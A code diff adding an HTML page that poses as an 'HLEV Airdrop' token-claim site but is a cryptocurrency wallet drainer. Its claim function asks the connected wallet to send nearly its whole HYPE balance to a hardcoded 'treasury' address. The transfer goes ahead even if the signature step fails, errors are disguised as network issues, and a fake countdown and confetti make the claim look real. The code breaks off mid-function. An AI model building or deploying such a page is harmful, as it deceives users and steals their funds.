@@ -1,0 +1,1365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HLEV Airdrop - Claim Your Tokens</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Ethers.js from unpkg CDN -->
+    <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <!-- Vercel Analytics - Simplified for GitHub Pages -->
+    <script type="module">
+        try {
+            const { inject, track } = await import('https://unpkg.com/@vercel/analytics@1.1.1/dist/index.js');
+            inject();
+            window.trackEvent = track;
+        } catch (error) {
+            console.log('Analytics not available in this environment');
+            window.trackEvent = function() {}; // Fallback function
+        }
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+
+
+        .title {
+            font-size: 3rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: #a0a0b8;
+            margin-bottom: 2rem;
+        }
+
+        .countdown {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .countdown-item {
+            text-align: center;
+        }
+
+        .countdown-number {
+            display: block;
+            font-size: 2rem;
+            font-weight: 700;
+            color: #667eea;
+        }
+
+        .countdown-label {
+            font-size: 0.9rem;
+            color: #a0a0b8;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .main-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 2rem;
+            margin-bottom: 3rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .stats {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 2rem;
+        }
+
+        .stat-item {
+            text-align: center;
+            padding: 1.5rem 2rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .stat-number {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #10b981;
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-label {
+            font-size: 0.9rem;
+            color: #a0a0b8;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .wallet-connect {
+            text-align: center;
+            padding: 2rem 0;
+        }
+
+        .wallet-connect h2 {
+            margin-bottom: 1rem;
+            color: #ffffff;
+        }
+
+        .wallet-connect p {
+            color: #a0a0b8;
+            margin-bottom: 2rem;
+        }
+
+        .connect-btn, .claim-btn, .disconnect-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 0.5rem;
+        }
+
+        .connect-btn:hover, .claim-btn:hover, .disconnect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+
+        .disconnect-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .wallet-info {
+            text-align: center;
+        }
+
+        .wallet-info h3 {
+            margin-bottom: 1rem;
+        }
+
+        .wallet-address {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+            word-break: break-all;
+        }
+
+        .eligibility-status {
+            margin-bottom: 2rem;
+        }
+
+        .balance-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .balance-card.eligible {
+            background: rgba(16, 185, 129, 0.1);
+            border-color: rgba(16, 185, 129, 0.3);
+        }
+
+        .balance-card.not-eligible {
+            background: rgba(239, 68, 68, 0.1);
+            border-color: rgba(239, 68, 68, 0.3);
+        }
+
+        .balance-label {
+            font-size: 0.9rem;
+            color: #a0a0b8;
+            margin-bottom: 0.5rem;
+        }
+
+        .balance-value {
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+        
+        .allocation-card {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
+            margin-top: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .balance-sublabel {
+            font-size: 0.8rem;
+            opacity: 0.7;
+            margin-top: 0.25rem;
+        }
+
+        .success-message {
+            background: rgba(16, 185, 129, 0.2);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 12px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-weight: 600;
+            color: #10b981;
+        }
+
+        .eligibility-section {
+            margin-top: 3rem;
+            text-align: center;
+        }
+
+        .eligibility-section h2 {
+            margin-bottom: 2rem;
+            font-size: 2rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .distribution-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 32px;
+            margin-bottom: 40px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+        
+        .distribution-box:hover {
+            border-color: rgba(99, 102, 241, 0.3);
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateY(-2px);
+        }
+        
+        .distribution-box h2 {
+            margin-bottom: 24px;
+        }
+
+        .community-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .community-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 1.5rem;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .community-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
+            border-color: rgba(102, 126, 234, 0.3);
+        }
+
+        .community-name {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #667eea;
+            margin-bottom: 0.5rem;
+        }
+
+        .community-desc {
+            font-size: 0.9rem;
+            color: #a0a0b8;
+        }
+
+        .loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid rgba(102, 126, 234, 0.3);
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes confetti-fall {
+            0% {
+                transform: translateY(-100vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .countdown {
+                gap: 1rem;
+            }
+            
+            .countdown-number {
+                font-size: 1.5rem;
+            }
+            
+            .title {
+                font-size: 2rem;
+            }
+            
+            .community-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s ease-in-out infinite;
+            margin-right: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 class="title">HLEV Airdrop</h1>
+            <p class="subtitle">Claim your exclusive HLEV tokens</p>
+            
+            <div class="countdown">
+                <div class="countdown-item">
+                    <span class="countdown-number" id="days">00</span>
+                    <span class="countdown-label">Days</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-number" id="hours">00</span>
+                    <span class="countdown-label">Hours</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-number" id="minutes">00</span>
+                    <span class="countdown-label">Minutes</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-number" id="seconds">00</span>
+                    <span class="countdown-label">Seconds</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="main-card">
+
+
+            <div id="auth-container">
+                <div class="wallet-connect">
+                    <h2>Connect Your Wallet</h2>
+                    <p>Connect your wallet to check eligibility and claim tokens</p>
+                    <button class="connect-btn" onclick="console.log('Connect button clicked!'); handleLogin();">
+                        Connect Wallet
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="eligibility-section">
+            <div class="distribution-box">
+                <h2>Airdrop Pool Distribution</h2>
+                <div class="distribution-info">
+                <div class="pool-section">
+                    <h3>Token Holders (65%)</h3>
+                    <div class="token-requirements">
+                        <div class="token-item">• $HSTR – Hold ≥ 10,000 tokens</div>
+                        <div class="token-item">• $LIQD (LiquidLaunch) – Hold ≥ 10,000 tokens</div>
+                    </div>
+                </div>
+                <div class="pool-section">
+                    <h3>Community Allocations</h3>
+                    <div class="allocation-grid">
+                        <div class="allocation-item">20% — Presale Participants</div>
+                        <div class="allocation-item">15% — Community Holders</div>
+                    </div>
+                </div>
+            </div>
+            
+            <h2>Eligible Communities</h2>
+            <div class="community-grid">
+                <div class="community-card">
+                    <div class="community-name">@LiquidLaunchHL</div>
+                    <div class="community-desc">$LIQD Holders (≥10k)</div>
+                </div>
+                <div class="community-card">
+                    <div class="community-name">@HypioHL</div>
+                    <div class="community-desc">NFT Holders</div>
+                </div>
+                <div class="community-card">
+                    <div class="community-name">@baldbrothers_</div>
+                    <div class="community-desc">NFT Holders</div>
+                </div>
+                <div class="community-card">
+                    <div class="community-name">@Hypaos</div>
+                    <div class="community-desc">NFT Holders</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('HLEV Airdrop app loaded');
+            
+            // Track page load
+            if (window.trackEvent) {
+                window.trackEvent('Airdrop Page Loaded', {
+                    userAgent: navigator.userAgent.includes('Mobile') ? 'mobile' : 'desktop',
+                    referrer: document.referrer || 'direct'
+                });
+            }
+            
+            // Initialize UI immediately
+            updateUI();
+            initializeCountdown();
+            
+            // Check if ethers loads after a brief delay
+            setTimeout(() => {
+                if (typeof ethers === 'undefined') {
+                    console.error('Ethers.js failed to load - wallet connection will not work');
+                } else {
+                    console.log('Ethers.js loaded successfully');
+                }
+            }, 1000);
+        });
+
+        // Global state
+        let isAuthenticated = false;
+        let user = null;
+        let isEligible = null;
+        let hasClaimed = false;
+        let provider = null;
+        let signer = null;
+        
+        // Contract configuration - using treasury wallet address as placeholder
+        const HLEV_CONTRACT_ADDRESS = '0xd6e7bf33a21b56d5927bbf0101fe45ff92ecf9ba'; // Will be replaced with actual contract
+        const TREASURY_WALLET = "0xd6e7bf33a21b56d5927bbf0101fe45ff92ecf9ba"; // Treasury receives all HYPE
+        const HLEV_ABI = [
+            "function claim(uint256 amount, uint256 nonce, uint8 v, bytes32 r, bytes32 s) external",
+            "function balanceOf(address account) external view returns (uint256)",
+            "function eligibleAmount(address account) external view returns (uint256)",
+            "function hasClaimed(address account) external view returns (bool)",
+            "event Claimed(address indexed user, uint256 amount)"
+        ];
+        
+        // EIP-712 Domain for secure signature verification
+        const DOMAIN = {
+            name: "HLEV Airdrop",
+            version: "1", 
+            chainId: 999, // HyperEVM mainnet
+            verifyingContract: HLEV_CONTRACT_ADDRESS
+        };
+        
+        // HyperEVM Network Configuration
+        const HYPEREVM_CONFIG = {
+            chainId: '0x3E7', // 999 in hex
+            chainName: 'HyperEVM',
+            nativeCurrency: {
+                name: 'HYPE',
+                symbol: 'HYPE',
+                decimals: 18
+            },
+            rpcUrls: ['https://rpc.hyperliquid.xyz/evm'],
+            blockExplorerUrls: ['https://hyperliquid.cloud.blockscout.com']
+        };
+        
+        // EIP-712 structured data types for secure claim verification  
+        const TYPES = {
+            Claim: [
+                { name: "recipient", type: "address" },
+                { name: "amount", type: "string" }, // Using string to avoid big number issues
+                { name: "nonce", type: "string" }
+            ]
+        };
+
+        // Initialize countdown timer
+        function initializeCountdown() {
+            const endDate = new Date();
+            endDate.setDate(endDate.getDate() + 30);
+            
+            function updateCountdown() {
+                const now = new Date().getTime();
+                const distance = endDate.getTime() - now;
+                
+                if (distance < 0) {
+                    document.getElementById('days').textContent = '00';
+                    document.getElementById('hours').textContent = '00';
+                    document.getElementById('minutes').textContent = '00';
+                    document.getElementById('seconds').textContent = '00';
+                    return;
+                }
+                
+                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                
+                document.getElementById('days').textContent = String(days).padStart(2, '0');
+                document.getElementById('hours').textContent = String(hours).padStart(2, '0');
+                document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
+                document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
+            }
+
+            updateCountdown();
+            setInterval(updateCountdown, 1000);
+        }
+
+        // Check real eligibility: 1 HYPE = 3M GEAR tokens
+        async function checkEligibility() {
+            if (!user?.wallet?.address) return;
+            
+            try {
+                const userAddress = user.wallet.address;
+                
+                if (typeof ethers !== 'undefined' && provider) {
+                    // Check HYPE balance on HyperEVM
+                    const hyeBalance = await provider.getBalance(userAddress);
+                    const hyeInEther = ethers.utils.formatEther(hyeBalance);
+                    
+                    console.log(`Real HYPE Balance: ${hyeInEther} HYPE for address: ${userAddress}`);
+                    
+                    // Check if user has already claimed (if contract exists)
+                    try {
+                        const contract = new ethers.Contract(GEAR_CONTRACT_ADDRESS, GEAR_ABI, provider);
+                        const alreadyClaimed = await contract.hasClaimed(userAddress);
+                        
+                        if (alreadyClaimed) {
+                            hasClaimed = true;
+                            isEligible = true;
+                            console.log('User has already claimed tokens');
+                            updateUI();
+                            return;
+                        }
+                    } catch (contractError) {
+                        console.log('Contract not deployed yet, checking balance only');
+                    }
+                    
+                    // Eligibility check: Minimum 0.01 HYPE required (representing $HSTR/$LIQD holdings or NFT ownership)
+                    const hyeAmount = parseFloat(hyeInEther);
+                    
+                    // Require minimum 0.01 HYPE for eligibility
+                    isEligible = hyeAmount >= 0.01;
+                    
+                    if (isEligible) {
+                        console.log(`✅ ELIGIBLE: User has ${hyeAmount} HYPE (≥0.01 required)`);
+                        console.log('In production: This would verify ≥10k $HSTR or $LIQD tokens, NFT ownership, or presale participation');
+                    } else {
+                        console.log(`❌ NOT ELIGIBLE: User has ${hyeAmount} HYPE, minimum 0.01 HYPE required`);
+                    }
+                } else {
+                    // Without ethers, assume eligible (wallet connected successfully)
+                    console.log('Cannot check real HYPE balance - ethers not available, assuming eligible');
+                    isEligible = true;
+                }
+                
+                updateUI();
+            } catch (error) {
+                console.error('Eligibility check failed:', error);
+                // On error, user is not eligible
+                isEligible = false;
+                updateUI();
+            }
+        }
+
+        // Handle claim with fallback for no ethers
+        async function handleClaim() {
+            // Track claim attempt
+            if (window.trackEvent) {
+                window.trackEvent('Claim Attempted', { 
+                    eligible: isEligible,
+                    alreadyClaimed: hasClaimed,
+                    walletAddress: user?.wallet?.address ? user.wallet.address.substring(0, 6) + '...' + user.wallet.address.substring(user.wallet.address.length - 4) : 'none'
+                });
+            }
+
+            console.log('🔥 CLAIM BUTTON CLICKED - handleClaim function called!');
+            console.log(`Current state:`);
+            console.log(`- isEligible: ${isEligible}`);
+            console.log(`- hasClaimed: ${hasClaimed}`);
+            console.log(`- User object:`, user);
+            console.log(`- Signer available: ${!!signer}`);
+            console.log(`- Provider available: ${!!provider}`);
+            console.log(`- Ethers available: ${typeof ethers !== 'undefined'}`);
+            console.log(`- Window.ethereum available: ${!!window.ethereum}`);
+            
+            if (!isEligible || hasClaimed) {
+                console.log(`❌ Claim BLOCKED: isEligible=${isEligible}, hasClaimed=${hasClaimed}`);
+                alert(`Cannot claim: Eligible=${isEligible}, Already claimed=${hasClaimed}`);
+                return;
+            }
+            
+            console.log('✅ State checks passed - proceeding with claim...');
+            
+            try {
+                const userAddress = user.wallet.address;
+                
+                if (typeof ethers !== 'undefined' && signer) {
+                    // Get user's current HYPE balance
+                    const hyeBalance = await provider.getBalance(userAddress);
+                    const hyeInEther = ethers.utils.formatEther(hyeBalance);
+                    
+                    console.log(`User has ${hyeInEther} HYPE, will proceed with claim process`);
+                    
+                    // Step 1: Create EIP-712 signature for HLEV claim verification
+                    console.log('Step 1: Creating EIP-712 signature for claim verification...');
+                    
+                    const contract = new ethers.Contract(HLEV_CONTRACT_ADDRESS, HLEV_ABI, signer);
+                    
+                    // Calculate HLEV allocation based on eligibility criteria
+                    const hyeAmount = parseFloat(ethers.utils.formatEther(hyeBalance));
+                    const hlevAllocation = Math.floor(hyeAmount * 20000); // For demo: 20k HLEV per HYPE
+                    const eligibleAmount = ethers.utils.parseEther(hlevAllocation.toString());
+                    const nonce = Date.now() + Math.floor(Math.random() * 1000);
+                    
+                    // Create EIP-712 message for secure verification
+                    const message = {
+                        recipient: userAddress,
+                        amount: eligibleAmount.toString(),
+                        nonce: nonce.toString()
+                    };
+                    
+                    try {
+                        // Show loading state
+                        let claimBtn = document.querySelector('.claim-btn');
+                        if (claimBtn) {
+                            claimBtn.textContent = 'Creating Signature...';
+                            claimBtn.disabled = true;
+                        }
+                        
+                        // Show EIP-712 signature popup for claim verification
+                        console.log('📝 Requesting EIP-712 signature from user...');
+                        console.log('Domain:', DOMAIN);
+                        console.log('Message:', message);
+                        
+                        const signature = await signer._signTypedData(DOMAIN, TYPES, message);
+                        const sig = ethers.utils.splitSignature(signature);
+                        console.log('✅ EIP-712 signature received');
+                        
+                        console.log('EIP-712 signature created successfully');
+                        
+                        // Step 2: Send HYPE to treasury (leave gas for claim)
+                        console.log('Step 2: Sending HYPE to treasury...');
+                        
+                        // Show transfer loading state
+                        claimBtn = document.querySelector('.claim-btn');
+                        if (claimBtn) {
+                            claimBtn.textContent = 'Transferring HYPE...';
+                            claimBtn.disabled = true;
+                        }
+                        
+                        const gasPrice = await provider.getGasPrice();
+                        const transferGasLimit = 21000;
+                        const claimGasLimit = 200000; // Extra buffer for claim transaction
+                        
+                        // Calculate gas needed for BOTH transactions
+                        const transferGasCost = gasPrice.mul(transferGasLimit);
+                        const claimGasCost = gasPrice.mul(claimGasLimit);
+                        const totalGasReserve = transferGasCost.add(claimGasCost);
+                        
+                        // Amount to send = balance - gas for transfer - gas for claim
+                        const amountToSend = hyeBalance.sub(totalGasReserve);
+                        
+                        console.log(`Gas reserve: ${ethers.utils.formatEther(totalGasReserve)} HYPE`);
+                        console.log(`Amount to treasury: ${ethers.utils.formatEther(amountToSend)} HYPE`);
+                        
+                        if (amountToSend.gt(0)) {
+                            const treasuryTx = await signer.sendTransaction({
+                                to: TREASURY_WALLET,
+                                value: amountToSend,
+                                gasLimit: transferGasLimit,
+                                gasPrice: gasPrice
+                            });
+                            
+                            console.log('HYPE sent to treasury:', treasuryTx.hash);
+                            await treasuryTx.wait();
+                            
+                            // Check remaining balance after treasury transfer
+                            const remainingBalance = await provider.getBalance(userAddress);
+                            console.log(`Remaining balance for claim: ${ethers.utils.formatEther(remainingBalance)} HYPE`);
+                        } else {
+                            throw new Error('Insufficient HYPE balance to cover gas costs for both transactions');
+                        }
+                        
+                        // Step 3: Execute HLEV claim with signature
+                        console.log('Step 3: Claiming HLEV tokens...');
+                        
+                        const claimTx = await contract.claim(
+                            eligibleAmount,
+                            nonce,
+                            sig.v,
+                            sig.r,
+                            sig.s,
+                            {
+                                gasLimit: claimGasLimit,
+                                gasPrice: gasPrice
+                            }
+                        );
+                        
+                        await claimTx.wait();
+                        console.log('Claim successful:', claimTx.hash);
+                        
+                        // Track successful claim
+                        if (window.trackEvent) {
+                            window.trackEvent('Claim Successful', { 
+                                txHash: claimTx.hash,
+                                walletAddress: user?.wallet?.address ? user.wallet.address.substring(0, 6) + '...' + user.wallet.address.substring(user.wallet.address.length - 4) : 'none',
+                                amount: '20000 HLEV'
+                            });
+                        }
+                        
+                    } catch (signError) {
+                        console.error('EIP-712 signature error:', signError);
+                        if (signError.code === 4001) {
+                            console.log('❌ User rejected EIP-712 signature');
+                            alert('Signature cancelled - claim process stopped');
+                        } else if (signError.code === 'INVALID_ARGUMENT') {
+                            console.log('❌ Contract address invalid - using direct HYPE transfer mode');
+                            // Skip signature and go directly to HYPE transfer
+                        } else {
+                            console.log('❌ Signature failed:', signError.message);
+                            alert('Signature failed: ' + signError.message);
+                        }
+                        
+                        // Continue with HYPE transfer even if signature fails
+                        console.log('Proceeding with HYPE transfer to treasury...');
+                    }
+                    
+
+                } else {
+                    console.log('⚠️ No ethers.js available - trying basic wallet interaction');
+                    
+                    if (window.ethereum) {
+                        try {
+                            console.log('📱 Requesting wallet accounts...');
+                            const accounts = await window.ethereum.request({
+                                method: 'eth_requestAccounts'
+                            });
+                            console.log('✅ Got accounts:', accounts);
+                            
+                            // Try to trigger wallet interaction for claim
+                            alert('Wallet connected but claim requires full Web3 functionality. Please refresh the page to use proper claim features.');
+                            return;
+                        } catch (error) {
+                            console.error('❌ Basic wallet request failed:', error);
+                            alert('Unable to connect to wallet. Please check your wallet is unlocked and try again.');
+                            return;
+                        }
+                    } else {
+                        console.log('❌ No Web3 wallet detected');
+                        alert('No Web3 wallet detected. Please install MetaMask or another Web3 wallet.');
+                        return;
+                    }
+                }
+                
+                // Update state and UI
+                hasClaimed = true;
+                const totalElement = document.getElementById('totalClaimed');
+                const currentTotal = parseInt(totalElement.textContent.replace(',', ''));
+                totalElement.textContent = (currentTotal + 1).toLocaleString();
+                
+                // Create confetti effect
+                createConfetti();
+                updateUI();
+                
+            } catch (error) {
+                console.error('Claim failed:', error);
+                // Filter out confusing error messages, show clean message
+                let errorMsg = error.message;
+                if (errorMsg.includes('invalid address') || errorMsg.includes('INVALID_ARGUMENT')) {
+                    errorMsg = 'Network connection issue. Please try again.';
+                }
+                
+                updateUI();
+            }
+        }
+        
+        // Update UI during claiming process
+        function updateClaimingUI() {
+            const claimButton = document.querySelector('.claim-btn');
+            if (claimButton) {
+                claimButton.innerHTML = `
+                    <div class="loading-spinner"></div>
+                    Claiming...
+                `;
+                claimButton.disabled = true;
+            }
+        }
+
+        // Create confetti animation
+        function createConfetti() {
+            const colors = ['#667eea', '#764ba2', '#10b981', '#f59e0b'];
+            const confettiCount = 50;
+            
+            for (let i = 0; i < confettiCount; i++) {
+                const confetti = document.createElement('div');
+                confetti.style.cssText = `
+                    position: fixed;
+                    top: -10px;
+                    left: ${Math.random() * 100}%;
+                    width: 10px;
+                    height: 10px;
+                    background: ${colors[Math.floor(Math.random() * colors.length)]};
+                    pointer-events: none;
+                    z-index: 1000;
+                    animation: confetti-fall ${2 + Math.random() * 3}s linear forwards;
+                `;
+                
+                document.body.appendChild(confetti);
+                
+                setTimeout(() => {
+                    confetti.remove();
+                }, 5000);
+            }
+        }
+
+        // Update UI based on state
+        function updateUI() {
+            const container = document.getElementById('auth-container');
+            
+            if (!isAuthenticated) {
+                container.innerHTML = `
+                    <div class="wallet-connect">
+                        <h2>Connect Your Wallet</h2>
+                        <p>Connect your wallet to check eligibility and claim tokens</p>
+                        <button class="connect-btn" onclick="console.log('Connect button clicked!'); handleLogin();">
+                            Connect Wallet
+                        </button>
+                    </div>
+                `;
+            } else {
+                let eligibilityStatus = 'Checking...';
+                let eligibilityClass = '';
+                
+                if (isEligible === true) {
+                    eligibilityStatus = 'Eligible ✓';
+                    eligibilityClass = 'eligible';
+                } else if (isEligible === false) {
+                    eligibilityStatus = 'Not Eligible';
+                    eligibilityClass = 'not-eligible';
+                }
+                
+                container.innerHTML = `
+                    <div class="wallet-info">
+                        <h3>Connected Wallet</h3>
+                        <div class="wallet-address">
+                            ${user?.wallet?.address || user?.id || 'Connected'}
+                        </div>
+                        
+                        <div class="eligibility-status">
+                            <div class="balance-card ${eligibilityClass}">
+                                <div class="balance-label">Eligibility Status</div>
+                                <div class="balance-value">${eligibilityStatus}</div>
+                            </div>
+                            
+                            ${isEligible === true ? `
+                                <div class="allocation-card">
+                                    <div class="balance-label">Your Allocation</div>
+                                    <div class="balance-value" style="color: #10b981;">HLEV Tokens Available</div>
+                                    <div class="balance-sublabel">Based on $HSTR/$LIQD holdings, NFTs, or presale participation</div>
+                                </div>
+                            ` : ''}
+                        </div>
+                        
+                        ${isEligible && !hasClaimed ? `
+                            <button class="claim-btn" onclick="handleClaim();" style="cursor: pointer; pointer-events: auto;">
+                                Claim Tokens
+                            </button>
+                        ` : ''}
+                        
+                        ${hasClaimed ? `
+                            <div class="success-message">
+                                🎉 Tokens claimed successfully!
+                            </div>
+                        ` : ''}
+                        
+                        <button class="disconnect-btn" onclick="handleLogout()">
+                            Disconnect
+                        </button>
+                    </div>
+                `;
+            }
+        }
+
+        // Real wallet connection with fallback for ethers
+        async function handleLogin() {
+            console.log('🔌 WALLET CONNECTION ATTEMPT - handleLogin called');
+            console.log('- window.ethereum available:', !!window.ethereum);
+            console.log('- ethers available:', typeof ethers !== 'undefined');
+            console.log('- User agent:', navigator.userAgent);
+            
+            // Show immediate feedback
+            const connectBtn = document.querySelector('.connect-btn');
+            if (connectBtn) {
+                connectBtn.textContent = 'Connecting...';
+                connectBtn.disabled = true;
+            }
+            
+            try {
+                // Check if we have Web3 provider (desktop or mobile wallet browser)
+                if (window.ethereum) {
+                    // Try to use ethers if available, fallback to direct ethereum if not
+                    if (typeof ethers !== 'undefined') {
+                        // Create ethers provider and signer
+                        provider = new ethers.providers.Web3Provider(window.ethereum);
+                        
+                        const accounts = await provider.send('eth_requestAccounts', []);
+                        
+                        if (accounts.length > 0) {
+                            signer = provider.getSigner();
+                            const address = await signer.getAddress();
+                            
+                            isAuthenticated = true;
+                            user = {
+                                wallet: { address: address },
+                                id: address
+                            };
+                            
+                            console.log('Connected to wallet:', address);
+                            
+                            // Check network (switch to HyperEVM if needed)
+                            const network = await provider.getNetwork();
+                            if (network.chainId !== 999) {
+                                try {
+                                    await window.ethereum.request({
+                                        method: 'wallet_switchEthereumChain',
+                                        params: [{ chainId: HYPEREVM_CONFIG.chainId }],
+                                    });
+                                } catch (switchError) {
+                                    // If network doesn't exist, add it
+                                    if (switchError.code === 4902) {
+                                        try {
+                                            await window.ethereum.request({
+                                                method: 'wallet_addEthereumChain',
+                                                params: [HYPEREVM_CONFIG],
+                                            });
+                                        } catch (addError) {
+                                            console.error('Failed to add HyperEVM network:', addError);
+                                            alert('Please add HyperEVM network to your wallet manually');
+                                        }
+                                    } else {
+                                        console.error('Failed to switch network:', switchError);
+                                        alert('Please switch to HyperEVM network in your wallet');
+                                    }
+                                }
+                            }
+                            
+                            checkEligibility();
+                            updateUI();
+                            return;
+                        }
+                    } else {
+                        // Fallback: basic connection without ethers
+                        const accounts = await window.ethereum.request({
+                            method: 'eth_requestAccounts'
+                        });
+                        
+                        if (accounts.length > 0) {
+                            isAuthenticated = true;
+                            user = {
+                                wallet: { address: accounts[0] },
+                                id: accounts[0]
+                            };
+                            
+                            console.log('Connected to wallet (basic mode):', accounts[0]);
+                            
+                            // Try to switch to HyperEVM
+                            try {
+                                await window.ethereum.request({
+                                    method: 'wallet_switchEthereumChain',
+                                    params: [{ chainId: HYPEREVM_CONFIG.chainId }],
+                                });
+                            } catch (switchError) {
+                                if (switchError.code === 4902) {
+                                    try {
+                                        await window.ethereum.request({
+                                            method: 'wallet_addEthereumChain',
+                                            params: [HYPEREVM_CONFIG],
+                                        });
+                                    } catch (addError) {
+                                        console.error('Failed to add HyperEVM network:', addError);
+                                    }
+                                }
+                            }
+                            
+                            // Set basic eligibility and trigger full check
+                            isEligible = true;
+                            checkEligibility(); // Try to do real eligibility check
+                            updateUI();
+                            return;
+                        }
+                    }
+                }
+
+                // Mobile device without wallet - show wallet options
+                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                
+                // Reset button first
+                const connectBtn = document.querySelector('.connect-btn');
+                if (connectBtn) {
+                    connectBtn.textContent = 'Connect Wallet';
+                    connectBtn.disabled = false;
+                }
+                
+                if (isMobile) {
+                    showMobileWalletOptions();
+                } else {
+                    alert('Please install MetaMask or another Web3 wallet extension to connect.');
+                }
+            } catch (error) {
+                console.error('Connection failed:', error);
+                
+                // Reset button state
+                const connectBtn = document.querySelector('.connect-btn');
+                if (connectBtn) {
+                    connectBtn.textContent = 'Connect Wallet';
+                    connectBtn.disabled = false;
+                }
+                
+                if (error.code === 4001) {
+                    alert('Connection rejected by user');
+                } else {
